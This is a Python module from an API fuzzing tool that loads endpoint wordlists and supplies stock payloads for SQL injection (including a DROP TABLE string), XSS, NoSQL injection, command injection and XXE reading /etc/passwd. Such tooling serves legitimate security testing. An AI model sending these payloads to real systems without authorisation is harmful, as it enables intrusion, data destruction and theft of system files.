"""Wordlist loader for endpoint discovery."""

from pathlib import Path
from typing import List, Optional
import gzip


class WordlistLoader:
    """Load and manage wordlists for fuzzing."""

    # Default wordlist embedded
    DEFAULT_ENDPOINTS = [
        # Common REST endpoints
        "/api", "/api/v1", "/api/v2", "/api/v3",
        "/users", "/user", "/profile", "/me",
        "/posts", "/post", "/articles", "/article",
        "/products", "/product", "/items", "/item",
        "/admin", "/administrator", "/config", "/configuration",
        "/auth", "/login", "/logout", "/register", "/signin", "/signup",
        "/data", "/list", "/get", "/create", "/update", "/delete",
        "/search", "/query", "/filter", "/sort",
        "/upload", "/download", "/export", "/import",
        "/status", "/health", "/ping", "/version",
        "/swagger", "/swagger.json", "/openapi.json",
        "/docs", "/documentation", "/help",
        "/debug", "/test", "/sandbox",
        "/webhook", "/webhooks", "/callback", "/event",
        "/graphql", "/.graphql",
        "/soap", "/webservice", "/ws",
        # API paths
        "/api/users/list", "/api/users/create", "/api/users/update", "/api/users/delete",
        "/api/admin/users", "/api/admin/settings",
        "/api/public", "/api/private",
        "/api/internal", "/api/external",
    ]

    def __init__(self, custom_wordlist: Optional[str] = None):
        """
        Initialize wordlist loader.

        Args:
            custom_wordlist: Path to custom wordlist file
        """
        self.custom_wordlist = custom_wordlist
        self.wordlist = self.DEFAULT_ENDPOINTS.copy()

        if custom_wordlist:
            self._load_custom(custom_wordlist)

    def _load_custom(self, path: str):
        """Load custom wordlist from file."""
        try:
            file_path = Path(path)

            if not file_path.exists():
                raise FileNotFoundError(f"Wordlist file not found: {path}")

            # Handle gzipped files
            if path.endswith('.gz'):
                with gzip.open(file_path, 'rt') as f:
                    lines = f.readlines()
            else:
                with open(file_path, 'r') as f:
                    lines = f.readlines()

            # Clean and add lines
            for line in lines:
                line = line.strip()
                if line and not line.startswith('#'):
                    self.wordlist.append(line)

        except Exception as e:
            raise RuntimeError(f"Error loading custom wordlist: {str(e)}")

    def get_endpoints(self, limit: Optional[int] = None) -> List[str]:
        """
        Get list of endpoints.

        Args:
            limit: Maximum number of endpoints to return

        Returns:
            List of endpoints
        """
        wordlist = self.wordlist

        if limit:
            return wordlist[:limit]

        return wordlist

    def get_parameters(self) -> List[str]:
        """Get common parameter names for fuzzing."""
        return [
            "id", "user_id", "product_id", "item_id",
            "page", "limit", "offset", "sort",
            "query", "q", "search", "filter",
            "admin", "debug", "test", "token",
            "api_key", "key", "secret", "password",
            "username", "email", "role", "permission",
        ]

    def get_payloads(self, payload_type: str) -> List[str]:
        """Get payloads for specific vulnerability type."""
        payloads = {
            "sqli": [
                "' OR '1'='1",
                "' OR 1=1 --",
                "admin' --",
                "' UNION SELECT NULL --",
                "1; DROP TABLE users --",
            ],
            "xss": [
                "<script>alert('xss')</script>",
                "\"><script>alert(1)</script>",
                "javascript:alert(1)",
                "<img src=x onerror=alert(1)>",
                "<svg onload=alert(1)>",
            ],
            "nosqli": [
                "{\"$ne\": null}",
                "{\"$gt\": \"\"}",
                "{\"$where\": \"1==1\"}",
                "'); return true; //",
            ],
            "command_injection": [
                "; whoami",
                "| whoami",
                "& whoami",
                "` whoami `",
                "$(whoami)",
            ],
            "xxe": [
                "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><foo>&xxe;</foo>",
                "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ELEMENT foo ANY><!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><foo>&xxe;</foo>",
            ],
        }

        return payloads.get(payload_type, [])
